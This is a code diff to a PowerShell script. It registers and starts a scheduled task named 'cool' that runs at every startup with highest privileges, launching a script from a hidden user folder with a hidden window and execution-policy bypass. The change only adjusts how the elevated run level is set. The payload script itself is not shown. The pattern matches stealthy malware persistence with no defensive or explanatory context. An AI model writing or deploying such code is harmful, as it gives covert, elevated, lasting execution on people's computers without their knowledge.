@@ -10,8 +10,7 @@ $file_content | Add-Content -Path $file
 
 $task = New-ScheduledTaskAction -Execute 'Powershell.exe' -Argument '-W Hidden -Exec Bypass %USERPROFILE%\.cool\cool.ps1'
 $trigger = New-ScheduledTaskTrigger -AtStartup
-$principal = New-ScheduledTaskPrincipal -RunLevel Highest
 
-Register-ScheduledTask -Principal $principal -Trigger $trigger -Action $task -TaskName "cool"
+Register-ScheduledTask -Trigger $trigger -Action $task -RunLevel Highest -TaskName "cool"
 
 Start-ScheduledTask -TaskName "cool"
